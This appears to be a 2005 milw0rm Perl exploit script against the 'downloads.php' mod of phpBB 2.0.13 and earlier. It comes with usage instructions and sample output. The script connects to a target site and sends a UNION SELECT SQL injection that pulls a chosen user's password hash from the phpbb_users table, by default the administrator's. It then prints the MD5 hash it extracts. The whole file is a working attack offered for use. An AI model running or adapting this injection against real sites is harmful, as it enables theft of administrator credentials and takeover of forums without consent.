#!/usr/bin/perl -w
use IO::Socket;

##    Example:
##    C:\>phpbb.pl www.site.com /phpBB2/ 2
##
##     downloads.php mod in phpBB <= 2.0.13
##     **********************************
##      [~] Connecting...
##      [+] Connected!
##      [~] Sending Data...
##      [~] Data Sent, Waiting for response...
##      [+] MD5 Hash for user with id=2 is: 81dc9bdb52d04dc20036dbd8313ed055
##
if (@ARGV < 3)
{
print "\n\n";
print "|****************************************************************|\n";
print " phpBB <=2.0.13 'downloads.php' Mod\n";
print " Bug found by Axl And CereBrums\n";
print " Coded by CereBrums // 2/4/2005\n";
print " Usage: phpbb.pl <site> <folder> <user_id>\n";
print " e.g.: phpbb.pl www.site.com /phpBB2/ 2 \n";
print " [~] <server> - site address\n";
print " [~] <folder> - forum folder\n";
print " [~] <user_id> - user id (2 default for phpBB admin)\n";
print "|****************************************************************|\n";
print "\n\n";
exit(1);
}

$take = 0;
$success = 0;
$server = $ARGV[0];
$folder = $ARGV[1];
$user_id = $ARGV[2];
print "\n downloads.php mod in phpBB <= 2.0.13\n";
print " **********************************\n";
print "  [~] Connecting...\n";
$socket = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => "$server",
PeerPort => "80") || die "$socket error $!";

print "  [+] Connected\n";
print "  [~] Sending Data...\n";

$path = "http://$server/";
$path .= "/$folder/";
$path .= "downloads.php?cat=-1%20UNION%20SELECT%200,user_password,0,0,0,0,0,0,0%20FROM%20phpbb_users%20WHERE%20user_id=$user_id/*";
print $socket "GET $path HTTP/1.0\r\n\r\n";

print "  [~] Data Sent, Waiting for response...\n";

while ($answer = <$socket>)
{
       if ($take == 1) {
               $pass = substr($answer,51,32);
               print "  [+] MD5 Hash for user with id=$user_id is: $pass\n";
               $success = 1;
               $take = 0;
       }
       $found = rindex ($answer,"downloads.php?view=detail&id=0&cat=0");
       if ( $found > -1 ) {
               $take = 1;
       }
}
if ($success==0) {print "  [-] Exploit failed\n";}

## EOF ##

# milw0rm.com [2005-04-02]
